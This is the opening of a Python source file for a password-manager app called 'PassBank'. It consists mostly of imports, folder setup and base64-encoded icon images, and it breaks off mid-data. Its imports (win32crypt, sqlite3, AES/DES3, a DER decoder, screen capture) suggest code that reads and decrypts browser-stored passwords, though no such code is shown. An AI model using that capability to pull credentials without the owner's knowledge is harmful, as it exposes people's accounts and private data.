import re
import pyrebase
import customtkinter
import os
import requests
import random
import hmac
import logging
import string
import base64
import hashlib
import base64
import pwnedpasswords
import concurrent.futures
import threading
import json 
import base64 
import sqlite3 
import win32crypt 
import shutil 
from urllib.parse import urlparse
from PIL import Image, ImageGrab, ImageFilter
from cryptography.fernet import Fernet
from tkinter import PhotoImage, Frame
from Cryptodome.Cipher import AES, DES3
from pathlib import Path
from getpass import getpass
from pyasn1.codec.der.decoder import decode as der_decode
from time import sleep
from sys import exit

folder_path = os.path.join(os.getenv('APPDATA'), 'PassBank')

if os.path.exists(folder_path) and os.path.isdir(folder_path):
    pass
else:
    os.mkdir(folder_path)

    data = {'add_password.png': 'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgEAQAAACJ4248AAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAAAqo0jMgAAAAlwSFlzAAAAYAAAAGAA8GtCzwAAAAd0SU1FB+cIBA8bIg+NkE8AAAIkSURBVFjD7VWxLzNhHH5+10rapFJEook0l4ZEUFKjRSQiZ/EPsBSDHZMJAxMjixCbxGCwGCTCIiGMbCYGBqkQ6TX1Poa37fX066eJ3vDlu2e5u+d+eZ/n+d3vfQ/w4cPH/w4BAHJlBRwc9EYhnwfX1sQ4P69aQ35+0lNsb1fTDuqLYWgno6P1jW9ZkIWF0vrVDRS6ZZycAABVMAiZnARDIcjenkg263RrZARIpYD9fZHHR4fv6gLHx4GzMzGurjQXj9fks9io0rNaXXXat7NTLu7w9/dkIKD5piby5UXzuRzZ3a35qanva3xHldakUo67svtyHokEEI3qGtMEmps139AAJpPuhH19VLOzVP39NXbAsqje30nbJicmnLr2dp2cJLe2HN4wyKMjzV9fU0UiZEcHeXlZOZDHx1RtbX81oLlwmCoSqTQbCJAtLX8MolpbSREyFiOfnqrvittbqsZGoHQOFMR5cFDT0PwE6ekBenuLloGZGaCzE1hcdIqWl0WWlgolmYw3+//jg9zc1N2JRsnDQ1IpkqS6u3M6oJJJQE/u79PH48D6uk62sSHG/Lz7M52eQoaHAdsWCYXqoukSYCzm3qrptObDYXJujnx70+8eHuou7qS8uXFM2DaVaZJjY7Uez3UwYFnu/0s+7xZ/fSUTCc8MAAA5PU1ms5WD+fxMNTRUrBNPTSjThKTTwMAAmMtBLi6A3V2RTMbT9D58+Pin8AUZNnN8IS8I8AAAAABJRU5ErkJggg==', 'back-arrow.png': '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', 'back.png': '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', 'banner.png': '', 'box.png': '', 'breach.png': 'iVBORw0KGgoAAAANSUhEUgAAAEAAAABAEAYAAAD6+a2dAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAAGYktHRAAAAAAAAPlDu38AAAAJcEhZcwAAAGAAAABgAPBrQs8AAAAHdElNRQfnCQIRFTfyYKE8AAANuElEQVR42u2de1RU9RbHv/ucmTFFKd+KacE4oOSS1bIyzZtgWbnWbVma+Ug0y5uWj8rKrpqwRuxhaWZp3VtiPkApNXuZRSqIJlrWFSOVx4CKKCE+SAGDOWffP47HGYFxmGHmnLH4/DNrzvzO7+zf77fP/u3faw/QRBNN/H0hvQXQGpZnhkc80aoVqHnOxcSgIMcPVRHXPVlRQcKbuTkrzp/XW06tuOYVgOV4Dgvt1g3E6+hETAyAJPyvb18wb8SEiAgQ/c4fREQAWEEjunTxIOv9fOD4cTAeoRk5OSCk4NncXDDbsWTPHkAeipK0NBJenWL7oqhI73rwlmtGAViO59BN4eEgmIS5sbEA90PxqFEAotGme3cdRXsEHfPyANyOO1NSwPI8Dl+zhoT5LxdMzsvTu97cEbAKwHLcrd2D778fhFny8lmzAGTTrIED9Zar4QXgON6cng4IopD6+uskWCl/emqq3mLVJmAUgHluVfd3Bw4EKJOXLFoEIB3o00dvuXzIPzD6p5/AfIvc4YUXSEgIKZy+c6feQummACzHc1hJhw4gnoK8hQsBvEcJY8cCsMJGAaOYfiAeZmaAboNl1SowfhFrXnqJBCvlflhWprUwmlc0czybOToa4OGckpwMoBe9EhKitRwBRB6MpaVg/CQPGDuWhHn5hcu//16rhwtaPYg5rsI8Yc4cgO1YvHUrmhpexYKaDh1AOCREbtnCPNcWFvbvf2v1cL9ZAOYRIwBRBCKzzB8uXQrwKCyYPFmrgl37UDL3e/99APkFSdOmEVkJkGWfP8XXGTo1/AlzTFISwPfg2KhRmtTZX5NKjFi3DqC3bG+MHetrRfBDFxC5xzz07bebGt5ntMD60aMBRJg/XLbM15n7zAI4+ngsQMb8+VrW0N8LHs88axZRgrmg4I03GptboxXAafxuYPu2bQASsEwU9a4m93IHBbVr51QRVFGh/SDMK+y4X5YBLOc/77uPaF5pQeK2bd5m5rUCOI3jH6W3s7IA9MTGTp30rh2X8nLnzrfcAkjS7bfHxgKS1LPnkCEAQEQECEJBwc6dgCj++GNSEiAIR4/u2aPcyay39PWSzfNPnADTRkNaVJS38wjeKwDHPRO2c/VqAO3o8dhYvWvDQbNmLVsCkhQZOWQIIEl9+owZAzB36BAe7kHF0JkzR44AopiVtWkTIIr792/YAABVVefO6V1GJ5g+x9YVK0iwHrCFPvmkp7d7rADK6tuAASCWyZKRAZ1n7pjbtQsLAyTp1ltHjgQkKSpq2DAAMJlatPDlk+z2P/8ERPHw4dRUxVKsWgUQlZQcOqRX6QFcnlnkavpnTAxRQvP86Tt2NPRmzxWA47abzfv2QfO5eoPBZAJk2WKJiVEafMQIQJZvvrlfP+2kqA3RyZO//aZYiPXrAVHMzv76awCoqamq0lAQRj+euncvCfOGFDx/550Nlr/B+XM8m99+4AGA47Fsyxa/l4dbt+7aVWnoRx8FZFl5s5mbN7/hBn8/3XsEobh4/37AaFyzZtw4AJBlSdJQACarvH3wYBKsVHjT1q3ukhs8yHk936hMUfrD3styaGj//oAk9e07frzjO0AkaDZh7T1Ep08XFgIGw8aNzz2nlEiSAOYWLVq3BiRp0KAXXwQE4bffNm8GBKGwcPdufwjC64Tw2bOVL+4VwG3VsvzKgrD/WCwAhtPyu+/2VwVK0l13TZoEyHJY2IABSpXq2fCimJX12WeAwZCe/s47gCAcO7ZvH1D7jVYb3mhMTp4wASC6cOHUKUfD19SMGbNiBSBJvXs/9BAgSf37T5zoV9EP48aYmMsbaNzg3gKQ+AotHTcO4ApU+dPZY/b9TLc3KH23wfDNN/HxDrlEcffujz4CgObNr7/eYaGIFMVw1fB1Rx81NRcvalAMYpmWjR6tfLFaXSVrwDvGPyN45Ej/SxwoCiBJdvvV5KmqKi8HBOHgwS1bPGl4FWU04XcY/ehF91PxLi0Ay3OWmYd27QpgA7ItFv9LrNGb4bV0sbGrVwNE5eUnTgCCYLNlZADAhQtlZYDdft99c+YAzO3bX22HIpHdXl2tgcCEBzClRw/mOUGWsi5diF5Ny2tXXFw7mesugMTW+HbQIAC/40YN5KUAm2CphTr6kOWuXfv0ASSpV68HH/Qmp/PnS0q0FFyo5OiYGOVLUlLtn6/mAyjbq4Hb4FVBPaWy8uxZ/+WummpRVJw64LrrgoMB5rZtQ0MB5jZtbr4ZYG7Zsn17f8px7tzx4/7Lv54HtpKnXpoXmOyZAozFrT16ADisjQW4cKG01H/5q322KB448Pnn/i+P63KePaupAjBvJI6IAHB9vfVylVs38MqICO0q5syZY8f8+QRJqqlx/u6wAGFhACCKhnpfB0FQ1jaV9I0v57lzmh4jISrDa67bsU6RlZUvIgA9aKd2q3vq4otWyHL79haLw7lTvX+i8vLjx5Xx/ZEjyrJxmzaN7xqIlC6OqLy8rivmV7rh+ZAQZgAzlJVPtZWB+iwAx3Pkp0FBAAz4TrupGKKzZxULcPGiPifzFAug+gKybLFERwPMISG9e/uifEVFykSS5svLl/ZnxHPn/zZvXvvHukaPao5eCG7VCjDAqKmcyrhbEEpKsrMbvsgjCMXFWVmKBTl61DEed2z4CApq2xYAZFkZ3+uDYyZRP0xPXerEJlVWqtc8WAvQBqKiol9+AQB3ClBdXVkJGI1JSePHA3X7+MAiEBSgXrnqXGHjTS3/0O94tCjabLt2NSSlwdCsGaDu6HG+bjI15P7g4I4d/V8eda2A6PffDx/2//OuRvWHf/xR+1o9XYCVDj5aUQHEzTY/I8vQ3Bc4eTI7W9mjd/q0YsoVE14bxTtnbt26WzeA6NSp/HzAbr/nnpdfVjaGPPyww/kClGEmUXV1RQUgyyEhUVH+L48oZmd/+aVWtVcvczFFkgArnZxUd4dCnYZ18hKf4oknT2ovr+oLKMum7lO3aRMa6iz/mTOFhYBqIZiDgzt1cjhzDt/C1zuG6krGDAhCdnZDyuFHhmJLcXFt71/F9ZvN3JGezsnRS2pRPHBg0yb36ZjbtbtSAcrKCgr0ktqBut6vw7DvShgjkOC6HV0rAAm92KJfr0VUWpqbq+zO3bv3KuXj4ODOnZ3vO306EBRAFHfu9P0xDi8gsnJLbxQAnEDrf/xRb/lFcffu5cvrK9epU3l5gCju2PHee86/mExOkX80RxDy83fscAxP9Ydf5tPKBvd65XV9n3QWD2zfrrf4qikVhCNHMjMdb7jRuHbtxImKk3fmjMNZrKkZNmzxYj0kVfp8gyEj40qF1BvpU8Mt6emufnW7w4c5rr95Yk4OgHuR5snOet+ibv8GKivPnXNueGWKtqbmscc+/tixuqc1ovjzzykpgMHw3XcJCXrV0hUM5UWHDhHN61PwUGSkq0QNGd79jOBPPtG7NKpzV/eNHzMmMVG/hlensA2GtLRFi/SuJWc4ErkpKe5SuVcApou4cfVqXD6AEBjY7YMHz56tWAazWQ8JlMUjo/GLL2bOBNSZyQBAPSjyuHBdcrK7xG4VgAQr2Wbk54OZ+d2GnzjxNwbDtm0LFjg2emj//PT0xYsBohMnfv1V79pwgrka5WlpRPM/yZ9us7lL7sEMnxLuTO/yqRCdP19aChiNGzZMmwYA1dVanMRR+3pR3Lt35Uq9a6HeirmJe732WkOTN1gBnOLcKeHOAgT1DTSZ1q6dMAHw1+FNxzmB1NRXX9W71PVyB/+QmenpcXHP5/iZ7uXkGTMQYD6BQxFSUp56ynddg/qm1z4nEECofX5LMr7wgqc3e6wAJFipoHDXrstx7gIM9bCm0ZiYOHy4+5nEuijb0w2GzZvnzlV8jbfeAgKw4RWYonhyYiJRQrStbWamp7d7v8p3KcAh1EAFAYa6mqhOGBkM336rjM/r7yKISkoOHgRMppUrR41ymPwARglmTdUdTNu8DyvX+BAxcjxbet59N4jt8r+2b0fAh4hRVglluWPHnj0BIuUoGNGpU7m5QABHBFH5k9+028H8LBcPGtTYkLM+DBKlBjikVUSBM1r4y8F4GoUzZ5Iwr7NNVjqnxuCzjR5OUatSMWXJEl0r6a/JPnz1wQe+angVP+z0oUzbjBkzcDnAYRONg1KxcO1agDbbIqdO9Xnu/hL78vkCju8YFrdwIYgnkTJ8bKJh7OaXli0D6PuCydOnXzOhYl3h5CN0o6nz5yPgnUXNueTc4TkaMXu2r029K7QPF+8YNQyX4tatQ1PU8Cd4fXExmE28a/Rorf9IQvMgLCRYKe9QRoYa4BDAMcz7+GME2MyiH1HLaePhiYlAzROmxKgovf5BJGD+mYN5bnbYN3fdBaYi5CxaBEImLe3bV2+5fMgd/ENmpjpl6+3Mna8JGAWoDctx3UMnDh4MwjxhzaxZAEZiYHQ0Av8vZZQ3/NKyrLo619iYvv4ikCvyCphfGdn9XbMZoBSeFhsLpr74buRINRSKjqJ9xVsOHgSwD898+ilAgjhhzRoiK+U9Fgj7k6/ONaMArmCeE2Mp69IFLI6T8wcNAiGZ9yt/HEkcEQGi0fgsPBzAV6CuXeHegqh99IPgoiIwr8Ow3FwQDWfKyQHzeWHpnj0gYY94x/btRFbKWRF4ayFNuID5xbG93woKYo7nm7hTJ8encl1v+ZpoookmtOP/asxr46Y2J7gAAAAASUVORK5CYII=', 'chrome.png': '', 'circle.png': 